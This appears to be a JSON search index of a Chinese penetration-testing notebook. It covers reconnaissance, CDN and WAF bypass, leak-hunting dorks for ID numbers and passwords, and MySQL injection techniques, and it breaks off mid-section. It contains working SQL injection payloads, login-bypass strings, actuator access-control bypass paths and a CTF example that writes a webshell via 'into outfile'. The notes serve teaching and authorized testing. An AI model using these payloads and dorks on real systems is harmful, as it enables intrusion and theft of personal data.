{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-11 22:54:33 "},"01.渗透测试/01.信息收集/01.资产收集.html":{"url":"01.渗透测试/01.信息收集/01.资产收集.html","title":"01.资产收集","keywords":"","body":"为什么 尽可能的扩大攻击面 主域名收集 ICP备案查询 是什么 ICP备案是指网站在信息产业部提交网站信息进行官方认可。 所以国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。 有什么用 通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。 WhoIs 是什么 WHOIS是用来查询互联网中域名的IP以及所有者等信息的传输协议。 有什么用 通过查询目标的WHOIS信息，可以对联系人、联系邮箱等信息进行反查，可以获取更多相关的域名信息。 股权信息 通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标 DNS共享记录查询 原理 查询共享DNS服务器的主机来获取到相关的域名 步骤 首先查询目标是否存在自建的NS服务器 nslookup -query=ns baidu.com 将非权威应答中的ns服务器带到下面的网站查询 Find all Hosts pointing to DNS Server 子域名收集 子域名爆破 原理 通过不断的拼接字典中的子域名前缀去枚举域名的A记录，再对其进行验证，但是该方法一般需要解决泛解析问题。 泛解析 A记录：*.khaz.top → 1.1.1.1 （这样xxx.khaz.top域名在进行dns解析时都会指向1.1.1.1） 如何解决泛解析： # 黑名单IP法 通过获取一个不存在的子域名相应解析IP，来记录标记黑名单ip，再爆破字典时，解析到的IP在这个黑名单ip中，则跳过，不存在就继续处理。 # TTL 在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。 以oneforall为例： oneforall会首先访问一个随机的并不存在的域，通过返回结果判断是否存在泛解析，确定存在泛解析以后，程序会开始不断的循环产生随机域名，去向服务器查询，将每次查询到的IP和TTL记录下来，直到大部分的IP地址出现次数都大于两次，则IP黑名单的收集结束，在得到了IP黑名单以后，oneforall接下来会将自己的字典中的每一项和要指定查询的域名进行拼接。在爆破过程中根据IP黑名单进行过滤。但这种宽泛的过滤容易导致漏报，所以oneforall将 TTL 也作为黑名单规则的一部分，评判的依据是：在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。 证书透明度 是什么 证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁。 有什么用 因为是公开的，所以任何人都可以访问到其中的CA 证书，包含了域名、子域名、邮箱等敏感信息。 在线查询 crt.sh | Certificate Search Censys Search DNS公开数据集 利用已有公开的扫描数据集，对子域名信息进行收集。 https://opendata.rapid7.com/ DNS 域传送 是什么 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 有什么用 若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者。 检测方法 dig请求 # 找到NS服务器 dig [domain] ns # 发送axfr请求 dig axfr @[ns] [domain] nmap脚本 --script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain] 搜索引擎 传统搜索引擎 site: xxx.com -xxx (-xxx 排除哪些子域) 网络空间测绘 站点爬虫 通过爬取网站中的url链接来发现新的子域名，通过Burp插件被动收集 站点信息泄漏 crossdomain.xml sitemap.xml 响应包中的CSP其中*-src可能会存在域名信息 第三方在线平台 https://securitytrails.com（UI好看，结果最多） DNSdumpster.com https://rapiddns.io/ 供应链单位 范围 开发商、外包商、运维商、硬件提供商 获取途径 页面版权所有，谁开发的 对官网等特定系统通过首页或目录扫描的备份文件或模板页面源代码中查找供应商 搜索引擎搜索特定系统名称-招标公告-应标单位 攻击方式 供应商示例系统的默认账号 供应商示例系统或该系统的其他使用单位进行漏洞尝试 如目标系统不开放注册但示例和其他公网系统开放注册功能，即可从前台转为后台进行黑盒测试 通过各种途径获取源码后进行代码审计 收集客服信息（人员信息、安全意识、浏览器版本、office版本）、IT管理员信息进行钓鱼 行业信息关键字 通过相关关键字进行检索发现资产 气象局 系统关键词 污染 排污 空气质量 垃圾焚烧 环评 辐射 监测 监控 环境 自然 生态 废物 质量 教育-教育厅 通过教育厅官网机构设置、直属单位获取组织结构 搜索引擎 site：xxx 直属单位 site：xxx 机构设置 教育考试院（招生考试院）直属于教育厅 教育-学校 组织架构 学校名下公司 出版社 基金会 校友会 网络空间搜索引擎 title、body domain cert icon 快速突破口：vpn、sso，在信息化门户搜集登录规则 google语法 site:xxx.com \"身份证号/学号/工号/vpn\" (filetype：xls/doc) GitHub \"xxx.edu.cn\" \"username/password/vpn\" 医疗-卫健委 提取关键字 机构-内设机构 委领导-分管工作 卫健委前身卫计委、卫生部/卫生厅/卫生局 妇幼保健院隶属于于卫健委 关键字：卫生健康委、卫生健康、卫计委、卫生和计划生育委员会 金融-银行 金融官网一般是业务，组织架构参考每年社会责任报告、年报、关于我们-信息披露中存 在组织架构 网络空间搜索引擎 domain cert： cert=\"China Merchants Bank\"/\"XX 银行\"/\"xxx.com\"/\"xxx\" icon Web突破点 微信公众号、小程序 移动端APP 未开放系统或测试系统 google语法 site:xxx.com \"身份证号\"/\"工号\"/\"vpn\" (filetype：xls/doc) site:xxx.com inurl:login/inurl:upload github语法 \"xxx.edu.cn\" \"username/password/vpn\" 邮箱查找可通过天眼查（收费） 政务-政务云 可能的突破点 市场监督管理局-特种设备管理 浪潮云表单 集约化 重要景区（可能） 广电局、广播电视局 跟广播电视台不同，行政单位和事业单位的区别 其他应用中的域名/IP 微信/支付宝小程序 微信公众号 手机APP：抓包，历史版本 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 19:13:39 "},"01.渗透测试/01.信息收集/02.指纹识别.html":{"url":"01.渗透测试/01.信息收集/02.指纹识别.html","title":"02.指纹识别","keywords":"","body":"为什么 根据对应的指纹进行特定攻击 前端：JS,WebPack 后端：后端语言缺陷 组件：框架，中间件漏洞 端口服务：特定协议，应用攻击 识别安全设备 指纹识别原理 TideFinger/Web指纹识别技术研究与优化实现.md at master · TideSec/TideFinger 主动识别：特定文件的MD5，特定路径 被动识别：关键字匹配 手工判断指纹 前端js代码，文件名，路径等放到github，gitee搜 icon信息等放到空间搜索引擎 版权标识如url，logo等（可能注释或者删除了） 从URI中发现 CDN FromBYPASS-CDN/CDN 2023 完全攻击指南（一）.md at main · bin-maker/BYPASS-CDN · GitHub 是什么 CDN（Content Delivery Network），中文全称为内容分发网络。 简单的说就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。 这里CDN节点就充当了反向代理的作用 为什么要绕过 寻找真实IP，这样才可以进行端口扫描 绕过云Waf 判断CDN 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 通过不同定位地点的 ping 测试，如果没有使用CDN，则只会显示一个IP地址 http://www.webkaka.com/Ping.aspx （国内+国外） https://www.host-tracker.com/v3/check/ （国外） 判断 IP 是否在常见 CDN 服务商的服务器 IP 段上 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 利用 Nslookup 查询域名 服务器名称 同一个域名解析对应多个 IP 地址 CDN绕过方法 CDN费用问题 CDN 加速需要支付一定的费用，所以子站，国外很可能没有部署CDN。 历史 DNS 记录 IP History - ViewDNS.info 微步在线X情报社区-威胁情报查询威胁分析平台开放社区 邮箱法 让目标邮件服务器发送邮件给我们的邮箱，通过查看收到的邮件源码在一定情况下可以找到真实IP（可以看到对方使用的邮件服务器IP） 使用目标网站的邮件发送功能，将邮件发送给一个不存在的邮箱地址，因为找不到邮箱地址所以发送必然是失败的，这里邮件服务器可能会返回一个错误消息通知，在这个消息通知中就包含了该邮件服务器的真实IP 常见场景 RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 空间测绘引擎 favicon.ico 哈希特征 网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 真实 IP 使用 在获取到真实IP后，通过直接访问IP可能无法访问 修改 hosts 文件 burpsuite 测试 WAF判断 查看返回包有无WAF字样 WAFW00F 查看拦截页面信息 通过一些明显的注入来触发waf 83个Waf拦截页面-腾讯云开发者社区-腾讯云 （5年前） 30几款常见WAF的拦截页整理 （2021年） 蜜罐相关 https://github.com/cnrstar/anti-honeypot https://send-safe-honeypot-hunter.apponic.com/ Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 19:02:38 "},"01.渗透测试/01.信息收集/03.敏感信息收集.html":{"url":"01.渗透测试/01.信息收集/03.敏感信息收集.html","title":"03.敏感信息收集","keywords":"","body":"内部泄露文件 网盘搜索 种子搜索 wiki/文库/知识库搜索 QQ群、微信群、企业微信群、钉钉群、飞书群群文件 历史信息泄露 历史漏洞，历史漏洞报告 历史网页被waybackmachine抓取 历史网页快照被搜索引擎缓存 社工库信息泄露 代码托管平台 github 工具 https://github.com/damit5/gitdorks_go 使用 ./gitdorks_go_amd_linux -gd Dorks/smalldorks.txt -nws 20 -target gm7.org -tf tokenFile/tf.txt -ew 3 ./tokenFile/tf.txt → Github access token ../Dorks/smalldorks.txt → 关键字字典 GitLab: https://about.gitlab.com/ gitee: https://gitee.com/ 社工信息收集 人员基本信息 身份信息（姓名、性别、大概年龄） 单位职位 日常工作 岗位对外联系的主要内容 岗位对内联系的主要内容 是否掌握计算机基础 系统版本（Windows、Mac的常用版本） 软件安全情况（安全意识、浏览器版本、office版本） 单位基本信息 内部员工的互相称呼 老师、同学、哥、师傅 工作流 沟通软件、沟通方式，邮件、OA、微信、企业微信、钉钉、QQ等 运维策略 企业杀软有无和其类型 安全人员素质、是否出网、是否允许安装软件 办公方式（平台：PC、云桌面、标装机） 主动类 目录/文件扫描 关于目录 当目录存在时会自动在目录后加上/，如访问/admin后url会自动在其后增加/，即变为/admin/ 逐级Fuzz Nginx反代问题（一个目录对应一个web服务） 关于文件 备份文件扫描 中间件，框架，后端语言对应扫描 webshell扫描 TIPS： a.php文件存在，针对文件名进行fuzz扫描 多个域名进行备份文件扫描 域名的一部分，公司名称的缩写，目录名（目录为/cn，备份文件为/cn/cn.rar） 目录可能为域名的一部分，公司的缩写，系统名称的缩写等 403bypass Spring，Shiro权限绕过 0x727/BypassPro: 对权限绕过自动化bypass的burpsuite插件 (github.com) 403 /actuator/heapdump 200 /actuator/heapdump;.js 403 /actuator/httptrace 200 /actuator/httptrace/# (burp抓包改) 还有其他特殊情况 404 /sys/actuator 200 /sys/..;/actuator 200 /sys/;/actuator 很多时候访问actuator，不会显示端点，但是访问具体的端点是可以访问到的，这个时候可以访问mappings端点来查看存在哪些端点 burpfakeIP ​ JS中的信息 可能泄露接口，后台地址，密码等敏感信息 浏览器插件被动收集 Burp被动收集 报错信息 报错信息中通常有web服务器的各种信息，如物理路径，组件信息，主机系统等 相关关键词/语法 关键词 # 企业敏感信息 手机号 | 合同 | 名单 | 口令 | 隐私数据 | 内部 | 账号 | 通讯录 | 花名册 | 报表 | 投标文件 | 入职 | 设计图纸 | 简历 | 招标 | 密码 | 默认 # 后台 管理|后台|登陆|平台|系统 login|admin|manage|manager|admin_login|system # EDU https://blog.csdn.net/qq_29437513/article/details/124328269 关键词:银行卡|录取|申请|退伍|宿舍|图书，学生，教师，补助，免试，破格，团员，入党，积极分子 # js寻找接口 path: url: get( post( # 接口 get list upload download exec search encrypt decrypt token Google语法 Google语法之信息收集之道 (yuque.com) 常用语法 # 逻辑运算符 OR AND # 域名 site:xxx.com # ip段 site:1.1.1.* # 双引号包围必须出现xxx \"xxx\" # 搜索网站正文内容 intext \"版权所有：萍乡市自然资源和规划局\" intext:\"赣ICP备15000724号\" # 搜索缓存内容 cache: # 搜索url inurl: upload download ?id= ?path= .php .asp .aspx .jsp # 过滤内容 -xxx 空间搜索引擎 title=\"Directory listing for /\" title=\"index of/\" title=\"phpinfo\" tile=\"outlook\" / \"tomcat\" / \"weblogic\" # 查找特定应用 (title=\"平台\"||title=\"管理\"||title=\"系统\"||title=\"后台\"||title=\"登录\") server=\"WebSockify Python\" && title=\"Directory listing for /\" # 查找novnc（novnc运行在容器里） header=xxx # 请求头 感觉hunter的多 Hunter (icp.name=\"银行\"||icp.name=\"信用合作联社\"||icp.name=\"信用社联合社\") (icp.name=\"信托有限\"||icp.name=\"财务有限\"||icp.name=\"理财有限\") (icp.name=\"天然气集团\"||icp.name=\"核工业集团\"||icp.name=\"国家电网\"||icp.name=\"石油化工\"||icp.name=\"能源集团\") app.name==\"Vue.js\"&&(icp.name=\"银行\")&&(title=\"平台\"||title=\"管理\"||title=\"系统\"||title=\"后台\"||title=\"登录\") city=\"新余\"&&(title=\"智慧\"||title=\"政府\"||title=\"大数据\"||title=\"智能\") icp.industry=\"货币金融服务\" ip.province=\"江苏\" 搜索IP对应主机在江苏省的资产 ip.country=\"CN\" 中国资产（空间搜索引擎搜到的国外的都是bc，狠狠地污染） Fofa https://fofa.info/library Fofa网络测绘命令汇总 cert=英文缩写 # 证书内容 cert.subject=英文缩写 # 证书持有者 cert.issuer=英文缩写 # 证书颁发者 org=\"China Education and Research Network Center\" #教育网段 零零信安 Linux命令 Winodws下可以装个wls2 尴尬点😅 wsl2需要开启hyper-V，但是安卓模拟器又要关闭hyper-v，而且VM15.5以下的版本也需要关闭hyper-V。 虚拟化技术：https://yanglei253.github.io/2021/01/05/docker/docker1-virtualization/ # 关闭hyper-V后重新开启wsl # 开启hyper-V dism.exe /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V # 开启wsl支持 Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 图标哈希指纹提取 curl https://hunter.qianxin.com/favicon.ico | md5sum # hunter web.icon=\"md5\" # 360 favicon:\"MD5\" 敏感信息查找 整合成sh脚本，一键提取 提取Nginx日志文件中的200 grep -EHirn \"HTTP/1.1\\\" 200\" wxtest.zyxt.com.cn | cut -d ':' -f 2- > 200.txt 提取ip和url grep -E \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\" -r 1--color=auto 提取IP grep -E \"https?://[a-zA-Z0-9\\.\\/_&=@$%?~#-]*\" -r 1 --color=auto 提取域名 grep -EHirn \"http://|https://\" 200.txt | cut -d ':' -f 2- > url.txt 提取账密 grep -EHirn \"username|password|密码|credentials|passwd|pass|testuser|user|pwd|dbuser|token|jdbc|admin|login|sa|root\" 200.txt | cut -d ':' -f 2- > pass.txt 提取各种key grep -EHirn \"ak|密钥|accesskey|apikey|key|secret|corpid|corpsecret|cloud|oss\" 200.txt | cut -d ':' -f 2- > key.txt 提取文件下载 grep -EHirn \"\\?file|download|attachment\" | cut -d ':' -f 2- > FileDownload.txt 提取个人敏感信息 grep -EHirn \"phone|mobile|card|real_name|\\.png|\\.jpg|\\.mp4\" | cut -d ':' -f 2- > LeakInfo.txt 文件下载 # 目录遍历漏洞，目录名默认为host wget -r --no-pare url /mnt/c/Users/khaz/Downloads # 批量下载,比如存储桶遍历 wget -i urls.txt -P Download/ 文本类 cat file1.txt file2.txt fileN.txt > out.txt # 文本合并 sort 1pass.txt | uniq > 1pass.txt.tmp && mv 1pass.txt.tmp 1pass.txt # 排序+去重 javaweb查找数据库配置文件 find 路径 -type f |xargs grep \"com.mysql.jdbc.Driver\" Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 19:10:41 "},"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html":{"url":"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html","title":"Mysql基础操作","keywords":"","body":"Mysql登录 命令行参数 -u username 指定数据库用户名 -p password 指定数据库密码 -e 指定要运行的sql语句 -D 指定数据库名 -P 端口 登录 mysql -uroot -proot [-P3306 -h127.0.0.1] 修改密码 set password for root@localhost = password('xxx'); 开启远程连接 # 修改配置文件 bind-address = 0.0.0.0 # 为需要远程登录的用户赋予权限 grant all privileges on *.* to 'root'@'%' identified by '123' with grant option; flush privileges; 注：ip处填%的话则表示所有ip都可以访问 # 查看用户与主机关系 use mysql; select user,host from user; mysql8 https://blog.csdn.net/llf_cloud/article/details/83141338 退出 exit; quit; \\q; 基础知识 条件查询 where id xxx xxx： 运算符 解释 = 等于 <> ，!= 不等于 小于，小于等于 >，>= 大于,大于等于 in()，not in() 是否在数组中 and , && 逻辑与 or , \\ \\ 逻辑或 like '%xx%' 模糊查询 is null , is not null 是否为空 regexp 正则匹配 is between x and y 在x和y之间 常用表 注意sys 库是在MySQL5.6及以上版本才有的 记录所有数据库及表 information_schema.tables sys.schema_table_statistics_with_buffer sys.x$schema_table_statistics_with_buffer 字段：table_schema：数据库名称 table_name：数据库下的所有表 mysql.innodb_table_stats mysql.innodb_index_stats 字段：database_name：数据库名称 table_name：数据库下的所有表 记录所有数据库 information_schema.schemata 字段：SCHEMA_NAME：数据库名 记录含有自增id字段的数据库及表 sys.schema_auto_increment_columns 字段：table_schema：数据库名称 table_name：数据库下的所有表 记录所有字段 information_schema.columns 字段：table_name：表名 column_name：表下的所有字段名 配置信息 @@character set_ database：字符集 @@hostname：计算机名 @@version_compile_os：系统版本 @@basedir:mysql路径 @@datadir:myslq data存放路径 @@sql_mode：sql模式 @是用户变量，@@是系统变量 常用函数 select user(); 查看当前MySQL登录的用户名 select database(); 查看当前使用的数据库名 select version(); 查看当前MySQL版本 # 查看当前用户权限 SELECT * FROM mysql.user WHERE user = CURRENT_USER(); SHOW GRANTS FOR CURRENT_USER(); group_concat(字段名) 查看所有字段名，默认分隔符为, length() 获得长度 concat(str1,str2) 连接str1和str mid(str,a,length) 从a开始截取str字符length长度 substr(str,a,length) 从a开始截取str字符length长度 left/right(str,length) 返回最左边/最右边的length长度字符 ord(string) 返回字符串第一个字符的ascii码值 ascii(str) 返回字符的ascii码 rand()随机数 常用操作语句 创建表 CREATE TABLE IF NOT EXISTS `users`( `id` INT UNSIGNED AUTO_INCREMENT, `username` VARCHAR(10) NOT NULL, `passwd` VARCHAR(40) NOT NULL, PRIMARY KEY ( `id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8; AUTO_INCREMENT：自增 PRIMARY KEY：主键 对数据库的增删改查 增 create database 数据库名 删 drop database 数据库名 查 所有数据库 show databases 改 rename database 旧名 to 新名 对数据表的增删改查 增 create table 数据表名(id int,name char(10)) 参数形式：字段名 字段类型 删 drop table 数据表名 查 show tables 改 alter table 旧名 to rename 新名 对表数据的增删查改 增 insert into 表名(列1，列2 ... ) values(值1，值2 ... ) 删 delete from 表名 where 列名 = 值 查 所有内容 select * from 表名 查看表的结构 DESC 表名 / show columns from 表名 条件下所有列 select * from 表名 where 条件 条件下部分列 select 列1,列2,...,列n from 表名 where 条件; 改 修改数据 update 表名 set 列名=新值 where 条件 REPLACE INTO table_name VALUES(主键,value..) 修改列名 alter table 表名 change 旧列名 新列名 varchar(长度) replace into，需要更改一整条数据，不能只更改其中某列。 如果待写入数据已经存在，则先删除该行数据，然后插入新的数据。 如果待写入数据不存在，则直接插入新数据。 mysql> select * from users; +----+----------+--------+ | id | username | passwd | +----+----------+--------+ | 1 | khaz | 123 | | 2 | khaz2 | 1234 | +----+----------+--------+ 2 rows in set (0.00 sec) mysql> replace into users values(1,'passwd'); ERROR 1364 (HY000): Field 'username' doesn't have a default value mysql> replace into users values(1,'khaz3','passwd'); Query OK, 2 rows affected (0.00 sec) mysql> select * from users; +----+----------+--------+ | id | username | passwd | +----+----------+--------+ | 1 | khaz3 | passwd | | 2 | khaz2 | 1234 | +----+----------+--------+ 2 rows in set (0.00 sec) 对用户的增删查改 增 insert into users(username,password) values('khaz','wuhu') create user '用户名'@'来源地址' identified by '密码' 删 drop user 用户名 查 select user() 改 修改用户名 rename user 旧用户名 to 新用户名 修改密码 SET PASSWORD FOR 用户名 = PASSWORD('abc123'); sql注入相关解释 order by order by语句用于根据指定的列对结果集进行排序，支持字段名和字段位置 可选参数(排列方式): 升序(ASC) 默认 降序(DESC) 在sql注入中的使用： 判断字段数：当字段位置不存在时就会报错 order by注入 limit 用于分页 select* from article LIMIT 1,3 select * from article LIMIT 3 OFFSET 1 上面两种写法都表示取 2、3、4 三条条数据： 1.当 LIMIT 后面跟两个参数的时候，第一个数表示要跳过的数量，后一位表示要取的数量 2.当 LIMIT 和 OFFSET 组合使用的时候，LIMIT 后面只能有一个参数，表示要取的的数量，OFFSET表示要跳过的数量 。 select* from article LIMIT 3 表示取前三条数据 当 LIMIT 后面跟一个参数的时候，该参数表示要取的数据的数量。 在注入中的使用： 使用group_concat()批量查询输出结果长度有限制，需要使用linmit一条一条获取或使用concat()拼接得到结果 limit 0,1 limit 1,1 limit 2,1 .... union select与select union select语句用来合并两个或多个 SELECT 语句的结果集。所以union select可以用来查询其他表。 select 字段值1 from 表1 union select 字段值2 from 表2 union特性 1.union select只能查询两个表中共同都有的字段，如果一个字段在另外一个表中没有，就会报错 如users表比users2表多了school字段，查询users表中的school和users2表中的address，因为users2表中没有school字段，所以报错 2.(union) select 查询的字段数要一致，否则会报错 所以需要先用order by来判断字段数 3.union 自带去重功能（distinct的功能） 如果不想要去重可以使用union all select 1,2,3 select时不写后面的表名，这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组。 通过这个和union select 构造临时数据 users表中并没有要查询的数据,但是却返回了我们构造的数据! 而在下一次查询中，这个我们自定义的数据不存在，说明通过这样方式创建的数据的存活周期只在其查询语句执行时 所以通过上述操作就可以临时构造一个用户，达到登录的效果 联合查询注入 需要将前面的select语句设置为假，才能使用后面的union select 1,2,3来判断哪一个字段值是回显的，是可以利用的。（原因是一般获取的是第一个结果，而我们构造的union select 1,2,3在之后） id=-1 union select 1,2,3 select+XX和表名 列数取决于我们输入的数字个数，行数取决于表原来的行数。 注释符 单行注释符 --+ 实质上--是起到注释的作用，但是在sql中用--注释后面必须加一个空格--才生效 # 在URL中#表示锚点，带上#不会请求后端路由，而是刷新前端路由，所以 测试一般用URL编码后的%23 多行注释符 / / ``` 用于注释多行 /* */ ``` and 与 or 反引号 反引号是 mysql 的转义符，只要你不在列名、表名中使用 mysql 的保留字或中文，就不需要转义。 其他数据库也同样有保留字，如果使用的话也同样需要转义，只是转义符不同而已。 #假如表A中有一列名为select，查询该列 select select from A; #错误 select `select` from A; #正确 #假如存在表flag，用desc(describe)查询该表信息 desc flag A; #显示flag表信息，别名为A desc `flag` `A` #与上述语句相同 MySQL 关键字和保留字汇总（MySQL 8.0）： https://blog.csdn.net/m0_56921622/article/details/122975904 as AS命令用于使用别名重命名列或表。 别名仅在查询期间存在。 重命名表名 select c.ID from users as c 重命名列名 select c.ID as ID2 from users as c 注：可以把as省略，即select c.ID from users c等价于select c.ID from users as c 在sql注入可以用于无列名注入 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:49:47 "},"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html":{"url":"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html","title":"Sql注入详解--Mysql","keywords":"","body":"漏洞介绍 Sql注入漏洞是指服务器在处理Sql语句时错误地拼接用户提交的参数，打破了原有的Sql执行逻辑，导致攻击者可部分或完全掌握Sql语句执行效果的一类安全问题。 简单的例子 假设后端Sql代码 $sql=\"select * from users where id='$id';\" 用户提交 ?id=1' and 1=1 # 拼接后的sql语句 select * from users where id='1' and 1=1 #' 1'将第一个'闭合，#将第二个'注释掉，所以要进行注入，只需要将and 1=1部分替换为其他sql语句即可。 其实分析sqlmap的注入也是如此，注入语句由prefix，payload和suffix组成 图来源https://www.freebuf.com/column/161797.html 漏洞危害 获得数据库中的敏感信息，如手机号，身份证，邮箱，家庭地址等 获得网站后台账号 万能密码？（这年头还有吗🤔，还是有的。。） 拿到密码，通常需要逆向解密或者彩虹表破解 通过sql语句创建后台账号 任意读取文件 Getshell 提权 如何挖掘 一切与数据库有交互的地方都可能是注入点，取决于后端从HTTP请求报文中提取了什么数据并拼接到sql语句中 是否存在sql注入 判断闭合类型，通常使用报错，布尔，延时，数学运算等手法来检测 ' \" \\ +1，-1 报错函数 延时函数 实战中SQL注入最容易出现的地方_只有选择框和日期框,会出现sql注入情况吗-CSDN博客 漏洞利用 信息收集 站库分离 Web站点和数据库不在同一个主机上，所以不能通过数据库对Web站点进行读写操作 攻击手法 读取账密，转到web服务器上打 信息收集，数据库服务器是否在内网中 站库分离的判断方法 通用方法 读取配置文件，判断IP Mysql select @@hostname; //服务端主机名称 select * from information_schema.PROCESSLIST; //客户端主机名称和端口 Windows连接格式：主机名:Port Linux连接格式：IP:Port 本地连接格式：localhost:Port select user(); 如果不是localhost，大概率是站库分离。 数据库类型 各种信息 # ifnull(@@secure_file_priv,0) secure_file_priv为空时返回0,不为空时返回其值 SELECT concat_ws(0x0a, ifnull(@@secure_file_priv,0), concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment), concat_ws(0xefbc8c, @@hostname, @@port), concat_ws(0xefbc8c, user(), database()), concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir) ) # 结果 0 10.5.8-MariaDB-3，debian-linux-gnu，x86_64，Debian buildd-unstable kali，3306 root@localhost /var/lib/mysql/，/usr/lib/mysql/plugin/，/tmp，/usr # 得到后端执行的sql语句 select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE '%673245283%' LIMIT 1),2,3; Mysql攻击手法 admin登入 万能密码 # 后端代码Demo $query = \"SELECT * FROM manage WHERE user='$user' and passwd='$passwd'\"; if(mysql_query($query)) { echo \"登陆成功\"; } 通过布尔运算让where恒为真 注册覆盖 admin (有个空格)或者 (有个空格)admin 原理：用户名字段长度>5，所以可以添加空格，而sql语句执行时会将空格忽略。 联合查询构造临时用户 [GXYCTF2019]BabySQli # 后端代码Demo $query = \"SELECT * FROM manage WHERE user='$user'\"; $result = mysql_query($query) or die('SQL语句有误：'.mysql_error()); $users = mysql_fetch_array($result); if (!mysql_num_rows($result)) { echo \"alert('抱歉，用户名或者密码错误。');history.back();\"; exit; } else{ $passwords=$users['password']; if(md5($password)<>$passwords){ echo \"alert('抱歉，用户名或者密码错误。');history.back();\"; exit; } echo \"登陆成功\"; username=admin' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b' limit 1,2--+ passwd=c4ca4238a0b923820dcc509a6f75849b MD5(1)=c4ca4238a0b923820dcc509a6f75849b 联合查询注入 原理 sql语句为select,页面有回显查询结果。 $sql=\"SELECT * FROM users where id=$id \"; $result=mysql_query($sql); $row = mysql_fetch_array($result); echo 'Your Login name:'. $row['username']; echo 'Your Password:' .$row['password']; payload 先判断表中的列数 order by x union select null,null..... 这里使用null是因为需要匹配数据格式，而null是可以匹配任意数据格式的 再判断哪一列是输出点 每个位置输出不同的值来判断 最后进行注入 联合查询，获取库名 ?id=-1\"union select 1,2,group_concat(schema_name) from information_schema.schemata# 联合查询，获取表名 ?id=-1\"union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='已知库名'# ?id=-1\"union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name='已知库名'# 联合查询，获取字段名 ?id=-1\"union select 1,2,group_concat(column_name) from information_schema.columns where table_name='已知表名'# 联合查询，获取字段值 ?id=-1\"union select 1,2,group_concat(字段1，字段2...) from 已知表名# 注意： 因为后端查询语句可能只拿第一行查询结果如$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";，所以需要构造一个不存在的值如-1，使得联合查询的结果成为第一行； 要查的表的名称(这个表是不是在现在使用的数据库中，没有的话表名=数据库.表名) 堆叠注入 原理 后端使用的查询函数为mysqli_multi_query() ，支持多条语句查询 而不是mysqli_query() ，仅支持一条语句查询 局限性 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎的影响 无回显：在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略 解决方法：可以通过先将内容插入到数据库中，然后再通过查询查出来 payload ?id=1';sql语句;--+ 可以任意执行sql语句，危害很大 配合handle绕过关键字 【MySQL】MySQL 之 handler 的详细使用及说明 handler 表名 open ; handler 表名 read first; #打开表；读取第一条数据 handler 表名 read next;#与上一条语句一起用，读取下一条即第二条数据 配合预编译语句绕过 使用格式 set @tn = 'hahaha'; //存储表名 set @sql = concat('select * from ', @tn); //存储SQL语句 prepare query from @sql; //预定义SQL语句 execute query; //执行预定义SQL语句 (DEALLOCATE || DROP) prepare sqla; //删除预定义SQL语句 例题 [SUCTF 2018]MultiSQL set @sql=select '' into outfile '/var/www/html/favicon/shell3.php';prepare name from @sql;execute name; 转换脚本 a = \"select '' into outfile '/var/www/html/favicon/shell3.php'\" b = [] for i in a: b.append(str(ord(i))) c=','.join(b) res = 'char({})'.format(c) print(res) payload set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query; 报错注入 原理 